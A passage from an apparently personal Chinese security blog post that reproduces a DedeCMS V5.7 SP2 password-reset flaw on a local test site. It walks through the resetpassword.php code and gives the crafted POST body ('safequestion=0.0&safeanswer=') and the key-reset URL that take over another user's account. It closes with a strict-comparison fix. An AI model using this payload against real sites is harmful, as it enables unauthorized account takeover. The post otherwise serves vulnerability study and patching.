class="hljs-string">&quot;对不起，请不要非法提交&quot;</span>,<span class="hljs-string">&quot;login.php&quot;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-variable">$mid</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#[^0-9]#&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">GetOne</span>(<span class="hljs-string">&quot;SELECT * FROM #@__pwd_tmp WHERE mid = &#x27;<span class="hljs-subst">$mid</span>&#x27;&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$row</span>))<br>    &#123;<br>        <span class="hljs-title function_ invoke__">ShowMsg</span>(<span class="hljs-string">&quot;对不起，请不要非法提交&quot;</span>,<span class="hljs-string">&quot;login.php&quot;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$setp</span>))<br>    &#123;<br>        <span class="hljs-variable">$tptim</span>= (<span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">24</span>*<span class="hljs-number">3</span>);<br>        <span class="hljs-variable">$dtime</span> = <span class="hljs-title function_ invoke__">time</span>();<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dtime</span> - <span class="hljs-variable">$tptim</span> &gt; <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;mailtime&#x27;</span>])<br>        &#123;<br>            <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">executenonequery</span>(<span class="hljs-string">&quot;DELETE FROM `#@__pwd_tmp` WHERE `md` = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>);<br>            <span class="hljs-title function_ invoke__">ShowMsg</span>(<span class="hljs-string">&quot;对不起，临时密码修改期限已过期&quot;</span>,<span class="hljs-string">&quot;login.php&quot;</span>);<br>            <span class="hljs-keyword">exit</span>();<br>        &#125;<br>        <span class="hljs-keyword">require_once</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&quot;/templets/resetpassword2.htm&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$setp</span> == <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$key</span>)) <span class="hljs-variable">$pwdtmp</span> = <span class="hljs-variable">$key</span>;<br><br>        <span class="hljs-variable">$sn</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$pwdtmp</span>));<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>] == <span class="hljs-variable">$sn</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pwd</span> != <span class="hljs-string">&quot;&quot;</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pwd</span> == <span class="hljs-variable">$pwdok</span>)<br>                &#123;<br>                    <span class="hljs-variable">$pwdok</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pwdok</span>);<br>                    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;DELETE FROM `#@__pwd_tmp` WHERE `mid` = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br>                    <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">executenonequery</span>(<span class="hljs-variable">$sql</span>);<br>                    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE `#@__member` SET `pwd` = &#x27;<span class="hljs-subst">$pwdok</span>&#x27; WHERE `mid` = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">executenonequery</span>(<span class="hljs-variable">$sql</span>))<br>                    &#123;<br>                        <span class="hljs-title function_ invoke__">showmsg</span>(<span class="hljs-string">&#x27;更改密码成功，请牢记新密码&#x27;</span>, <span class="hljs-string">&#x27;login.php&#x27;</span>);<br>                        <span class="hljs-keyword">exit</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-title function_ invoke__">showmsg</span>(<span class="hljs-string">&#x27;对不起，新密码为空或填写不一致&#x27;</span>, <span class="hljs-string">&#x27;-1&#x27;</span>);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">showmsg</span>(<span class="hljs-string">&#x27;对不起，临时密码错误&#x27;</span>, <span class="hljs-string">&#x27;-1&#x27;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>到这里就是在设置密码的模块的了，在这里先加载模板界面让用户填入新的密码，在判断临时密码是否存在，若存在就对比key和数据库中查的pwdok是否一致，有然后再确认两次输入的密码是否一致后便可修改密码成功。</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title=".漏洞复现"></a>.漏洞复现</h4><p>访问<strong>127.0.0.1&#x2F;DedeCMS-V5.7-GBK-SP2-Full&#x2F;uploads&#x2F;member&#x2F;</strong></p>
+<p>点击注册</p>
+<p><img src="D:/Nodejs/node_global/node_modules/Sharpery-blog/source/_posts/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/image-20231203181338427.png" srcset="/img/loading.gif" lazyload alt="image-20231203181338427"></p>
+<p>创建账户后用admin账号查看刚创建账户的id(真正实战的情况下是要靠直接去获取)</p>
+<p><img src="D:/Nodejs/node_global/node_modules/Sharpery-blog/source/_posts/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/image-20231203181610700.png" srcset="/img/loading.gif" lazyload alt="image-20231203181610700"></p>
+<p>id为8</p>
+<p>通过上述的分析我们可以对URL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">127.0.0.1/DedeCMS-V5.7-GBK-SP2-Full/uploads/member/resetpassword.php<br></code></pre></td></tr></table></figure>
+
+<p>传入post数据</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dopost</span>=safequestion&amp;safequestion=<span class="hljs-number">0</span>.<span class="hljs-number">0</span>&amp;safeanswer=&amp;id=<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="D:/Nodejs/node_global/node_modules/Sharpery-blog/source/_posts/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/image-20231203183733967.png" srcset="/img/loading.gif" lazyload alt="image-20231203183733967"></p>
+<p>得到key后访问传入参数访问getpasswd模块，这里传入key(注意不能发包)</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/DedeCMS-V5.<span class="hljs-number">7</span>-GBK-SP2-Full/uploads/member/resetpassword.php?dopost=getpasswd&amp;key=<span class="hljs-number">3</span>NeuKnOt<br></code></pre></td></tr></table></figure>
+
+<p><img src="D:/Nodejs/node_global/node_modules/Sharpery-blog/source/_posts/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/image-20231203184110318.png" srcset="/img/loading.gif" lazyload alt="image-20231203184110318"></p>
+<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title=".漏洞修复"></a>.漏洞修复</h4><p>本漏洞产生源于对传入的参数没有做严格的判断，这里使用强比较”&#x3D;&#x3D;&#x3D;”</p>
+<p><img src="D:/Nodejs/node_global/node_modules/Sharpery-blog/source/_posts/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/image-20231203184356949.png" srcset="/img/loading.gif" lazyload alt="image-20231203184356949"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/" class="print-no-link">#DedeCMS-V5.7复现</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DedeCMS-V5.7复现</div>
+      <div>http://example.com/2023/12/03/DedeCMS-V5-7复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/14/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F(2)/" title="网络渗透作业(2)">
+                        <span class="hidden-mobile">网络渗透作业(2)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/containsWord.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
